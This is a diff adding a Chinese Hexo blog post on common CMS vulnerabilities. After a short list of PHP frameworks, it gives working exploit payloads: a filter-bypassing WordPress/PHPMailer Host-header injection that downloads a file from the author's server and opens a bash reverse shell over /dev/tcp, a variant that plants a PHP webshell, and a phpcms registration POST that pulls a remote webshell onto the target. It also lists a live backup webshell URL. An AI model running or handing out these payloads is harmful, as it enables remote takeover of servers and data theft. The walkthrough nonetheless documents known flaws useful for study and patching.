@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web漏洞," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="PHP框架什么是框架框架就是可重用代码的集合，框架的代码是框架架构的代码，不是业务逻辑代码，框架代码保护类.方法.函数等等，框架代码按照一定的规则组合起来就形成了框架。 PHP常用框架1.zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。2.Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。3.CakePHP是国外的框架.4.Symfony，是一套国外的">
+<meta name="keywords" content="web漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcms常见漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/03/18/phpcms常见漏洞/index.html">
+<meta property="og:site_name" content="pig-佩奇">
+<meta property="og:description" content="PHP框架什么是框架框架就是可重用代码的集合，框架的代码是框架架构的代码，不是业务逻辑代码，框架代码保护类.方法.函数等等，框架代码按照一定的规则组合起来就形成了框架。 PHP常用框架1.zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。2.Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。3.CakePHP是国外的框架.4.Symfony，是一套国外的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/18/AnFmvR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/18/AnFMb6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/18/AnFUKI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/19/An2YM6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/19/An2ReS.png">
+<meta property="og:updated_time" content="2019-03-19T08:18:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpcms常见漏洞">
+<meta name="twitter:description" content="PHP框架什么是框架框架就是可重用代码的集合，框架的代码是框架架构的代码，不是业务逻辑代码，框架代码保护类.方法.函数等等，框架代码按照一定的规则组合起来就形成了框架。 PHP常用框架1.zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。2.Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。3.CakePHP是国外的框架.4.Symfony，是一套国外的">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/03/18/AnFmvR.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/18/phpcms常见漏洞/"/>
+
+
+
+
+
+  <title>phpcms常见漏洞 | pig-佩奇</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+	<a href="https://shuaizhupeiqi.github.io"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_green_007200.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pig-佩奇</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/18/phpcms常见漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="佩奇">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pig-佩奇">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">phpcms常见漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-18T00:00:00+08:00">
+                2019-03-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="PHP框架"><a href="#PHP框架" class="headerlink" title="PHP框架"></a>PHP框架</h1><h2 id="什么是框架"><a href="#什么是框架" class="headerlink" title="什么是框架"></a>什么是框架</h2><p>框架就是可重用代码的集合，框架的代码是框架架构的代码，不是业务逻辑代码，框架代码保护类.方法.函数等等，框架代码按照一定的规则组合起来就形成了框架。</p>
+<h2 id="PHP常用框架"><a href="#PHP常用框架" class="headerlink" title="PHP常用框架"></a>PHP常用框架</h2><p>1.zendframwork: (ZF)是Zend公司推出的一套PHP开发框架。<br>2.Yii由国人开发的重量级的框架，这个框架把代码的可重用性发挥到极致。<br>3.CakePHP是国外的框架.<br>4.Symfony，是一套国外的PHP开源框架。<br>5.CodeIgniter（CI）轻量级框架，运行速度快<br>6.CanPHP框架是一个简洁，实用，高效，遵循apache协议的php开源框架。<br>7。Laravel 是一个简单优雅的 PHP web 开发框架，将你从意大利面条式的代码中解放出来。通过简单的、表达式语法开发出很棒的 Web 应用。<br>8.SlimFramework是一个简单的 PHP5 框架用来创建 RESTful 的 Web 应用。<br>9.ThinkPHP是一个快速、简单、面向对象的轻量级PHP开发框架。<br>10.PHPUnit是一个轻量级的PHP测试框架。<br>11、KYPHP支持多数据库，多语言，多模版，多app,多缓存，多编码格式，模板布局，自定义类，自动加载公共类库。<br>12、initPHP是一款轻量级的php开发框架。<br>13、SpeedPHP是一款全功能的国产PHP应用框架系统。</p>
+<p>参考：<a href="http://baijiahao.baidu.com/s?id=1604870874054619554&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">http://baijiahao.baidu.com/s?id=1604870874054619554&amp;wfr=spider&amp;for=pc</a></p>
+<h2 id="php常用cms"><a href="#php常用cms" class="headerlink" title="php常用cms"></a>php常用cms</h2><p>wordpress</p>
+<p>phpcms </p>
+<p>dedecms(织梦)</p>
+<p>Ecms(帝国cms)</p>
+<p>Discuz</p>
+<p>参考：<a href="https://www.cnblogs.com/yonge/articles/2662334.html" target="_blank" rel="noopener">https://www.cnblogs.com/yonge/articles/2662334.html</a></p>
+<h1 id="cms常见漏洞"><a href="#cms常见漏洞" class="headerlink" title="cms常见漏洞"></a>cms常见漏洞</h1><h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h2><p>wordpress 编写采用原生php，并不是基于框架开发。</p>
+<p>漏洞影响版本：WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18，此处记录下复现过程。</p>
+<p>首先搭建环境。</p>
+<pre><code>下载镜像：docker pull medicean/vulapps:w_wordpress_6
+
+启动环境： docker run -it -d -p 8888:80 medicean/vulapps:w_wordpress_6 
+
+然后交互式进入docker镜像 docker exec -it 775c7c9ee1e1 /bin/bash  
+</code></pre><p>这里搭建8888端口映射镜像的80 http服务，安装好之后打开存在漏洞的url</p>
+<pre><code>http://47.106.185.69:8888//wp-login.php?action=lostpassword
+</code></pre><p>这里输入admin，必须要服务器存在用户才可以成功完成攻击。</p>
+<h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h3><p>首先我们进行命令执行反弹shell。</p>
+<p>第一步在服务器端创建存在反弹shell命令的文件，第二步 bash运行反弹shell的文件。</p>
+<p>poc构建之前先给个tip</p>
+<pre><code>空格 ==&gt; {substr{10}{1}{tod_log}}
+
+/ ==&gt; {substr{0}{1}{spool_directory}}
+</code></pre><p>第一步poc：</p>
+<pre><code>原poc aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /tmp/rce xx.106.185.xx/a.txt}} null)
+
+绕过后：
+aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}xx.106.185.xx${substr{0}{1}{$spool_directory}}a.txt}} null)
+</code></pre><p>xx.106.185.xx改为自己的IP，poc为访问自己IP上的a.txt并保存在自己服务器上的/tmp/rce文件里。第二步我们运行rce文件即可。</p>
+<p>其中xx.xx.xx.xx/a.txt内容为：  bash -i &gt;/dev/tcp/自己IP/6666 0&lt;&amp;1 2&gt;&amp;1</p>
+<p>第二步poc：</p>
+<pre><code>原poc aa(any -froot@localhost -be ${run{/bin/bash /tmp/rce}} null)
+
+绕过后：
+aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)
+</code></pre><p>实战，打开url <a href="http://47.106.185.69:8888//wp-login.php?action=lostpassword" target="_blank" rel="noopener">http://47.106.185.69:8888//wp-login.php?action=lostpassword</a> 输入admin，提交抓包。</p>
+<p>修改host头，并且使用第一条poc。复制第一条poc到host头，</p>
+<p><img src="https://s2.ax1x.com/2019/03/18/AnFmvR.png" alt=""></p>
+<p>即可看到服务器创建了rce文件。<br><img src="https://s2.ax1x.com/2019/03/18/AnFMb6.png" alt=""><br>43 0<br>接下来使用第二个poc，一样的做法粘贴到host头，自己的服务器监听端口等待shell.</p>
+<p><img src="https://s2.ax1x.com/2019/03/18/AnFUKI.png" alt=""></p>
+<p>可以看到已经反弹回来shell。</p>
+<h3 id="创建shell"><a href="#创建shell" class="headerlink" title="创建shell"></a>创建shell</h3><p>创建shell，很简单就创建文件即可，</p>
+<pre><code>原poc :
+aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /var/www/html/shell.php xx.xx.xx.xx/zk/one.txt}} null)
+
+绕过poc：
+
+aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}shell.php${substr{10}{1}{$tod_log}}xx.xx.xx.xx${substr{0}{1}{$spool_directory}}zk${substr{0}{1}{$spool_directory}}one.txt}} null)
+</code></pre><p>即可成功创建，连接菜刀即可，</p>
+<p>xx.xx.xx.xx/zk/one.txt写一句话木马即可。</p>
+<p>然后连接shell.php菜刀即可。</p>
+<p>参考：<a href="https://www.cnblogs.com/ssooking/p/8893264.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssooking/p/8893264.html</a></p>
+<h2 id="phpcms"><a href="#phpcms" class="headerlink" title="phpcms"></a>phpcms</h2><h3 id="phpcms任意文件上传getshell"><a href="#phpcms任意文件上传getshell" class="headerlink" title="phpcms任意文件上传getshell"></a>phpcms任意文件上传getshell</h3><p>为了方便复现，源码下载。</p>
+<pre><code>链接: https://pan.baidu.com/s/1geNQfyb 密码: gxsd
+</code></pre><p>安装成功后，打开注册页面。</p>
+<pre><code>http://127.0.0.1/phpcms/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
+</code></pre><p>直接post如下poc，然后提交即可返回shell地址。</p>
+<pre><code>poc:siteid=1&amp;modelid=11&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=
+</code></pre><p>注意：帐号或者邮件不能与别人重复。否则无法报错返回shell地址，但是已经创建。</p>
+<p><img src="https://s2.ax1x.com/2019/03/19/An2YM6.png" alt=""></p>
+<p>返回shell地址，直接连接即可。</p>
+<p><img src="https://s2.ax1x.com/2019/03/19/An2ReS.png" alt=""></p>
+<p>其中src=xx.xx.xx可以搭建在自己公网上shell文件，写马。让服务器下载。</p>
+<pre><code>自己备用。http://47.106.185.69/a.php
+</code></pre><p>参考：<a href="https://www.hackersb.cn/hacker/219.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/219.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web漏洞/" rel="tag"># web漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/13/钟馗之眼/" rel="next" title="钟馗之眼简单使用">
+                <i class="fa fa-chevron-left"></i> 钟馗之眼简单使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/23/一些脚本poc/" rel="prev" title="poc脚本整理">
+                poc脚本整理 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">佩奇</p>
+              <p class="site-description motion-element" itemprop="description">佩奇的后花园</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP框架"><span class="nav-number">1.</span> <span class="nav-text">PHP框架</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是框架"><span class="nav-number">1.1.</span> <span class="nav-text">什么是框架</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP常用框架"><span class="nav-number">1.2.</span> <span class="nav-text">PHP常用框架</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php常用cms"><span class="nav-number">1.3.</span> <span class="nav-text">php常用cms</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cms常见漏洞"><span class="nav-number">2.</span> <span class="nav-text">cms常见漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wordpress"><span class="nav-number">2.1.</span> <span class="nav-text">wordpress</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash反弹shell"><span class="nav-number">2.1.1.</span> <span class="nav-text">bash反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建shell"><span class="nav-number">2.1.2.</span> <span class="nav-text">创建shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phpcms"><span class="nav-number">2.2.</span> <span class="nav-text">phpcms</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phpcms任意文件上传getshell"><span class="nav-number">2.2.1.</span> <span class="nav-text">phpcms任意文件上传getshell</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">佩奇</span>
+
+  
+</div>
+-->
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
